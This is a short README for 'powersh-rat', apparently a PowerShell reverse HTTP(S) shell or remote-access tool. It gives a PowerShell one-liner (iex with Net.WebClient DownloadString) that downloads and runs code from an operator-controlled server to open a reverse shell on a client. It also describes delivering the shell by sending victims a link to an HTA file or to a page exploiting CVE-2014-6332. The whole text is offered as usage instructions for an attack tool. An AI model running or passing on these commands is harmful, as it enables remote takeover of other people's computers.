# powersh-rat
=======

PowerShell Reverse HTTP(s) Shell

- Invoke PoshRat.ps1 On An A server you control.  Requires Admin rights to listen on ports.
- To Spawn The Reverse Shell Run On Client

   iex (New-Object Net.WebClient).DownloadString("http://server/connect")
- [OR] Browse to or send link to http://server/app.hta
- [OR] For CVE-2014-6332 Send link to http://server/app.html
